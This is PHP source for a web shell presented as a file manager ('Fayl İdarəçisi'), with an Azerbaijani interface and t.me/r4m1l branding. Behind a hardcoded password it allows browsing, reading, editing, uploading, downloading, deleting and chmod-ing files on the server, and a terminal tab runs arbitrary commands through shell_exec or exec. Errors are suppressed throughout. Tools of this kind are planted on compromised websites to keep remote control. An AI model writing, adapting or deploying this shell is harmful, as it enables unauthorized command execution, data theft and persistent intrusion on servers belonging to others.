<?php
error_reporting(0);
@ini_set('display_errors', 0);

// Simple auth
session_start();
$pass = 'admin123'; // Bunu dəyiş

if(!isset($_SESSION['auth'])) {
    if(isset($_POST['pass']) && $_POST['pass'] == $pass) {
        $_SESSION['auth'] = true;
    } else {
        ?>
        <!DOCTYPE html>
        <html>
        <head>
        <meta charset="utf-8">
        <style>
            body {
                background-color: #121212;
                font-weight: bold;
                color: #e0e0e0;
                font-family: 'Marhey', sans-serif;
                display: flex;
                justify-content: center;
                align-items: center;
                height: 100vh;
            }
            input {
                background-color: #2a2a2a;
                color: #e0e0e0;
                border: none;
                padding: 10px;
                border-radius: 10px;
                margin: 5px;
            }
            button {
                background-color: #8f0000;
                color: #fff;
                border: none;
                padding: 10px 20px;
                border-radius: 10px;
                cursor: pointer;
                font-weight: bold;
            }
            button:hover { background-color: #980000; }
        </style>
        </head>
        <body>
            <form method="post">
                <input type="password" name="pass" placeholder="Password" required>
                <button type="submit">Login</button>
            </form>
        </body>
        </html>
        <?php
        exit;
    }
}

if(isset($_GET['logout'])) {
    session_destroy();
    header('Location: '.$_SERVER['PHP_SELF']);
    exit;
}

// Functions
function safe_path($p) {
    return str_replace(['../', '..\\'], '', $p);
}

function get_files($dir) {
    $dir = safe_path($dir);
    if(!is_dir($dir)) return [];
    $items = @scandir($dir);
    $result = [];
    foreach($items as $item) {
        if($item == '.' || $item == '..') continue;
        $path = $dir.'/'.$item;
        $result[] = [
            'name' => $item,
            'path' => $path,
            'type' => is_dir($path) ? 'dir' : 'file',
            'size' => is_file($path) ? @filesize($path) : 0,
            'perms' => @substr(sprintf('%o', @fileperms($path)), -4)
        ];
    }
    return $result;
}

// Actions
if(isset($_POST['act'])) {
    header('Content-Type: application/json');
    $act = $_POST['act'];
    
    if($act == 'list') {
        echo json_encode(get_files($_POST['dir']));
        exit;
    }
    
    if($act == 'read') {
        $content = @file_get_contents(safe_path($_POST['file']));
        echo json_encode(['ok' => $content !== false, 'data' => $content]);
        exit;
    }
    
    if($act == 'write') {
        $ok = @file_put_contents(safe_path($_POST['file']), $_POST['content']);
        echo json_encode(['ok' => $ok !== false]);
        exit;
    }
    
    if($act == 'delete') {
        $ok = @unlink(safe_path($_POST['file']));
        if(!$ok) $ok = @rmdir(safe_path($_POST['file']));
        echo json_encode(['ok' => $ok]);
        exit;
    }
    
    if($act == 'rename') {
        $ok = @rename(safe_path($_POST['old']), safe_path($_POST['new']));
        echo json_encode(['ok' => $ok]);
        exit;
    }
    
    if($act == 'chmod') {
        $ok = @chmod(safe_path($_POST['file']), octdec($_POST['perm']));
        echo json_encode(['ok' => $ok]);
        exit;
    }
    
    if($act == 'newfile') {
        $ok = @touch(safe_path($_POST['dir']).'/'.$_POST['name']);
        echo json_encode(['ok' => $ok]);
        exit;
    }
    
    if($act == 'newdir') {
        $ok = @mkdir(safe_path($_POST['dir']).'/'.$_POST['name']);
        echo json_encode(['ok' => $ok]);
        exit;
    }
    
    if($act == 'upload') {
        $ok = @move_uploaded_file($_FILES['file']['tmp_name'], safe_path($_POST['dir']).'/'.$_FILES['file']['name']);
        echo json_encode(['ok' => $ok]);
        exit;
    }
    
    if($act == 'cmd') {
        $out = '';
        if(function_exists('shell_exec')) {
            $out = @shell_exec($_POST['cmd'].' 2>&1');
        } elseif(function_exists('exec')) {
            @exec($_POST['cmd'].' 2>&1', $out);
            $out = implode("\n", $out);
        }
        echo json_encode(['out' => $out]);
        exit;
    }
    
    if($act == 'download') {
        $file = safe_path($_POST['file']);
        if(is_file($file)) {
            header('Content-Type: application/octet-stream');
            header('Content-Disposition: attachment; filename="'.basename($file).'"');
            readfile($file);
        }
        exit;
    }
}

$cwd = isset($_GET['dir']) ? safe_path($_GET['dir']) : getcwd();
?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>Fayl İdarəçisi</title>
    <style>
body {
    background-color: #121212;
    font-weight: bold;
    color: #e0e0e0;
    font-family: 'Marhey', sans-serif;
    margin: 0;
    padding: 0;
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: flex-start;
    min-height: 100vh;
    box-sizing: border-box;
}

h1 {
    color: #fdd835;
    margin: 20px 0;
    font-size: 2rem;
    text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.5);
}

.top-bar {
    background-color: #1e1e1e;
    padding: 15px;
    width: 90%;
    border-radius: 10px;
    margin: 20px 0;
    box-shadow: 0px 4px 8px rgba(0, 0, 0, 0.3);
}

.breadcrumb {
    display: flex;
    flex-wrap: wrap;
    gap: 5px;
    margin-bottom: 10px;
}

.breadcrumb a {
    color: #fdd835;
    text-decoration: none;
    padding: 5px 10px;
    background-color: #2a2a2a;
    border-radius: 5px;
}

.breadcrumb a:hover {
    background-color: #333;
}

.tabs {
    display: flex;
    gap: 10px;
    flex-wrap: wrap;
    width: 90%;
    margin-bottom: 20px;
}

.tab {
    background-color: #1e1e1e;
    padding: 10px 20px;
    border-radius: 10px;
    cursor: pointer;
    transition: background 0.3s;
    box-shadow: 0px 4px 8px rgba(0, 0, 0, 0.3);
}

.tab:hover, .tab.active {
    background-color: #8f0000;
}

.content {
    display: none;
    width: 90%;
}

.content.active {
    display: block;
}

ul.file-list {
    list-style: none;
    padding: 0;
    margin: 20px 0;
    width: 100%;
}

ul.file-list li {
    display: flex;
    align-items: center;
    justify-content: space-between;
    background-color: #1e1e1e;
    margin-bottom: 10px;
    padding: 10px;
    border-radius: 10px;
    box-shadow: 0px 4px 8px rgba(0, 0, 0, 0.3);
}

ul.file-list li:hover {
    background-color: #333;
}

ul.file-list li img {
    width: 24px;
    height: 24px;
    margin-right: 10px;
}

ul.file-list li span.file-name {
    flex: 1;
    color: #e0e0e0;
    font-weight: bold;
}

.file-actions {
    display: flex;
    gap: 5px;
}

.actions {
    display: flex;
    flex-direction: column;
    align-items: flex-start;
    width: 100%;
    margin-top: 20px;
}

.actions form {
    display: flex;
    flex-wrap: wrap;
    justify-content: space-between;
    margin-bottom: 15px;
    width: 100%;
}

.actions form input[type="text"],
.actions form textarea,
.actions input[type="file"] {
    width: 68%;
    margin-right: 10px;
    padding: 10px;
    border: none;
    border-radius: 10px;
    background-color: #2a2a2a;
    color: #e0e0e0;
}

.actions form input[type="submit"],
button.btn {
    flex: 1;
    max-width: 120px;
    background-color: #8f0000;
    color: #fff;
    border: none;
    border-radius: 10px;
    cursor: pointer;
    font-weight: bold;
    padding: 10px;
}

.actions form input[type="submit"]:hover,
button.btn:hover {
    background-color: #980000;
}

textarea {
    height: 300px;
    width: 100% !important;
    font-family: monospace;
}

.terminal {
    background-color: #000;
    color: #0f0;
    padding: 15px;
    border-radius: 10px;
    min-height: 400px;
    overflow-y: auto;
    font-family: monospace;
    white-space: pre-wrap;
}

.cmd-input {
    display: flex;
    margin-top: 10px;
    gap: 5px;
}

.cmd-input input {
    flex: 1;
    background-color: #2a2a2a;
    color: #0f0;
    border: none;
    padding: 10px;
    border-radius: 10px;
    font-family: monospace;
}

@media (max-width: 768px) {
    ul.file-list li {
        flex-direction: column;
        align-items: flex-start;
    }

    ul.file-list li img {
        margin-bottom: 10px;
    }

    .actions form {
        flex-direction: column;
        align-items: flex-start;
    }

    .actions form input[type="text"],
    .actions form textarea,
    .actions form input[type="submit"] {
        width: 100%;
        margin: 5px 0;
    }
    
    .file-actions {
        margin-top: 10px;
        width: 100%;
    }
}

.r4m1l_background { 
    position: fixed; 
    top: 0; 
    left: 0; 
    right: 0; 
    bottom: 0; 
    width: 100%; 
    height: 100%; 
    border-top-left-radius: 12px; 
    opacity: 0.15; 
    z-index: 1; 
    pointer-events: none; 
}

.r4m1l_background:before { 
    content: ''; 
    position: absolute; 
    top: 0; 
    left: 0; 
    bottom: 0; 
    right: 0; 
    background-image: linear-gradient(to top, transparent, rgba(0,0,0,0.54)); 
    z-index: 0; 
}

.logo-container {
    position: relative;
    z-index: 10;
}

.logo-container img {
    width: 98px;
    height: 105px;
}

.all-content {
    position: relative;
    z-index: 10;
    width: 100%;
    display: flex;
    flex-direction: column;
    align-items: center;
}
    </style>
</head>
<body>

<div class="r4m1l_background" style="background: url(https://i.imgur.com/Us6y1Th.gif) center center / cover no-repeat;"></div>

<div class="logo-container">
    <a href="?">
        <img src="https://i.imgur.com/4OIyQQe.png" alt="t.me/r4m1l">
    </a>
</div>

<div class="all-content">

<h1>Fayl İdarəçisi</h1>

<div class="top-bar">
    <strong>Yol:</strong>
    <div class="breadcrumb">
        <?php
        $parts = explode('/', $cwd);
        $path = '';
        foreach($parts as $p) {
            if(!$p) continue;
            $path .= '/'.$p;
            echo "<a href='?dir=$path'>$p</a>";
        }
        ?>
    </div>
    <div style="margin-top:10px">
        <a href="?logout=1" style="color:#8f0000;text-decoration:none">Logout</a>
    </div>
</div>

<div class="tabs">
    <div class="tab active" onclick="showTab('files')">📁 Fayllar</div>
    <div class="tab" onclick="showTab('editor')">📝 Redaktor</div>
    <div class="tab" onclick="showTab('terminal')">💻 Terminal</div>
    <div class="tab" onclick="showTab('upload')">⬆️ Upload</div>
</div>

<div id="files" class="content active">
    <div class="actions">
        <form onsubmit="event.preventDefault()">
            <input type="text" id="newfile" placeholder="Yeni fayl adı">
            <button class="btn" type="button" onclick="newFile()">Fayl Yarat</button>
        </form>
        <form onsubmit="event.preventDefault()">
            <input type="text" id="newdir" placeholder="Yeni qovluq adı">
            <button class="btn" type="button" onclick="newDir()">Qovluq Yarat</button>
        </form>
    </div>
    <ul class="file-list" id="filelist"></ul>
</div>

<div id="editor" class="content">
    <div class="actions">
        <form onsubmit="event.preventDefault()">
            <input type="text" id="editpath" placeholder="Fayl yolu">
            <button class="btn" type="button" onclick="loadFile()">Yüklə</button>
            <button class="btn" type="button" onclick="saveFile()">Saxla</button>
        </form>
        <textarea id="editcontent"></textarea>
    </div>
</div>

<div id="terminal" class="content">
    <div class="terminal" id="termout">$ Xoş gəldiniz</div>
    <div class="cmd-input">
        <span style="color:#0f0;padding:0 10px">$</span>
        <input type="text" id="cmdinput" onkeypress="if(event.key=='Enter')runCmd()" placeholder="Əmr daxil edin...">
        <button class="btn" onclick="runCmd()">İşə sal</button>
    </div>
</div>

<div id="upload" class="content">
    <div class="actions">
        <form onsubmit="event.preventDefault()">
            <input type="file" id="upfile">
            <button class="btn" type="button" onclick="uploadFile()">Yüklə</button>
        </form>
    </div>
</div>

</div>

<script>
let dir = '<?php echo addslashes($cwd); ?>';

function req(data, cb) {
    fetch('', {
        method: 'POST',
        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
        body: new URLSearchParams(data)
    }).then(r => r.json()).then(cb);
}

function showTab(id) {
    document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
    document.querySelectorAll('.content').forEach(c => c.classList.remove('active'));
    event.target.classList.add('active');
    document.getElementById(id).classList.add('active');
}

function loadList() {
    req({act:'list', dir:dir}, data => {
        let html = '';
        if(dir != '/') {
            let up = dir.split('/').slice(0,-1).join('/') || '/';
            html += `<li onclick="changeDir('${up}')"><span class="file-name">📁 ..</span></li>`;
        }
        data.forEach(f => {
            let acts = '';
            if(f.type == 'file') {
                acts = `
                    <button class="btn" onclick="event.stopPropagation();editIt('${f.path}')">Redaktə</button>
                    <button class="btn" onclick="event.stopPropagation();download('${f.path}')">Yüklə</button>
                `;
            }
            let click = f.type == 'dir' ? `changeDir('${f.path}')` : '';
            html += `<li onclick="${click}">
                <span class="file-name">${f.type=='dir'?'📁':'📄'} ${f.name} (${formatSize(f.size)}) [${f.perms}]</span>
                <div class="file-actions">
                    ${acts}
                    <button class="btn" onclick="event.stopPropagation();renameIt('${f.path}')">Ad Dəyiş</button>
                    <button class="btn" onclick="event.stopPropagation();chmodIt('${f.path}')">Chmod</button>
                    <button class="btn" onclick="event.stopPropagation();deleteIt('${f.path}')">Sil</button>
                </div>
            </li>`;
        });
        document.getElementById('filelist').innerHTML = html;
    });
}

function changeDir(d) {
    dir = d;
    location.href = '?dir=' + d;
}

function formatSize(b) {
    if(!b) return '0B';
    let k = 1024, s = ['B','KB','MB','GB'];
    let i = Math.floor(Math.log(b)/Math.log(k));
    return (b/Math.pow(k,i)).toFixed(1) + s[i];
}

function deleteIt(f) {
    if(!confirm('Silmək istədiyinizə əminsiniz?')) return;
    req({act:'delete', file:f}, d => {
        alert(d.ok ? 'Silindi' : 'Xəta baş verdi');
        loadList();
    });
}

function renameIt(f) {
    let n = prompt('Yeni ad:', f);
    if(!n) return;
    req({act:'rename', old:f, new:n}, d => {
        alert(d.ok ? 'Adı dəyişdirildi' : 'Xəta baş verdi');
        loadList();
    });
}

function chmodIt(f) {
    let p = prompt('İcazələr (məs: 0644):', '0644');
    if(!p) return;
    req({act:'chmod', file:f, perm:p}, d => {
        alert(d.ok ? 'Dəyişdirildi' : 'Xəta baş verdi');
        loadList();
    });
}

function newFile() {
    let n = document.getElementById('newfile').value;
    if(!n) return alert('Ad daxil edin');
    req({act:'newfile', dir:dir, name:n}, d => {
        alert(d.ok ? 'Yaradıldı' : 'Xəta baş verdi');
        document.getElementById('newfile').value = '';
        loadList();
    });
}

function newDir() {
    let n = document.getElementById('newdir').value;
    if(!n) return alert('Ad daxil edin');
    req({act:'newdir', dir:dir, name:n}, d => {
        alert(d.ok ? 'Yaradıldı' : 'Xəta baş verdi');
        document.getElementById('newdir').value = '';
        loadList();
    });
}

function editIt(f) {
    document.getElementById('editpath').value = f;
    document.querySelectorAll('.tab')[1].click();
    setTimeout(() => loadFile(), 100);
}

function loadFile() {
    let f = document.getElementById('editpath').value;
    if(!f) return;
    req({act:'read', file:f}, d => {
        if(d.ok) document.getElementById('editcontent').value = d.data;
        else alert('Fayl yüklənmədi');
    });
}

function saveFile() {
    let f = document.getElementById('editpath').value;
    let c = document.getElementById('editcontent').value;
    if(!f) return alert('Fayl yolunu daxil edin');
    req({act:'write', file:f, content:c}, d => {
        alert(d.ok ? 'Saxlanıldı' : 'Xəta baş verdi');
    });
}

function runCmd() {
    let cmd = document.getElementById('cmdinput').value;
    if(!cmd) return;
    let out = document.getElementById('termout');
    out.innerHTML += '\n$ ' + cmd + '\n';
    req({act:'cmd', cmd:cmd}, d => {
        out.innerHTML += d.out + '\n';
        out.scrollTop = out.scrollHeight;
    });
    document.getElementById('cmdinput').value = '';
}

function uploadFile() {
    let f = document.getElementById('upfile').files[0];
    if(!f) return alert('Fayl seçin');
    let fd = new FormData();
    fd.append('act', 'upload');
    fd.append('dir', dir);
    fd.append('file', f);
    fetch('', {method:'POST', body:fd})
    .then(r => r.json())
    .then(d => {
        alert(d.ok ? 'Yükləndi' : 'Xəta baş verdi');
        loadList();
    });
}

function download(f) {
    let form = document.createElement('form');
    form.method = 'POST';
    form.innerHTML = `<input name="act" value="download"><input name="file" value="${f}">`;
    document.body.appendChild(form);
    form.submit();
    document.body.removeChild(form);
}

loadList();
</script>
</body>
</html>
